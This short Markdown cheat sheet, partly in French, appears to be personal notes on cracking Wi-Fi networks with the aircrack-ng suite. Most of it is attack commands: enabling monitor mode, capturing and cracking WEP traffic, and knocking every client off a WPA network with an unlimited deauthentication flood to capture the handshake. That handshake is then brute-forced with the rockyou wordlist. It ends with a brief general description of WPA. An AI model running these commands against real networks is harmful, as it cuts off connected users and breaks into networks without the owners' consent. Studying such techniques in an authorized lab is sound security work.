### preparer notre interface réseau
```shell
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

### WEP
```shell 
sudo airodump-ng wlan0 --encrypt WEP 
```
```shell
sudo besside-ng -b <BSSID> -c <CHANNEL> wlan0
```
```shell
aircrack-ng ./wep.cap
```

### WPA
Discover wifi networks with airodump-ng :
```shell 
airodump-ng -w dump2 -c <CHANNEL> --bssid <BSSID> wlan0
```
Deauthenticate all devices while still monitoring the networks, waiting for the handshake: 
```shell 
aireplay-ng --deauth 0 -a <BSSID>
```
Using wireshark we can view the packets containing the authentication information sent by the machine trying to reconnect to the wifi network, we now have to decrypt this data to capture the authentication key
For this we use a password dictionnary and aircrack-ng
```shell 
aircrack-ng dump-02.cap -w /usr/share/wordlists/rockyou.txt
```

	
	
Wi-Fi Protected Access (WPA) is a security standard for users of computing devices with wireless Internet connections. WPA was developed by the Wi-Fi Alliance to provide more sophisticated data encryption and better user authentication than Wired Equivalent Privacy (WEP), the Wi-Fi security original standard.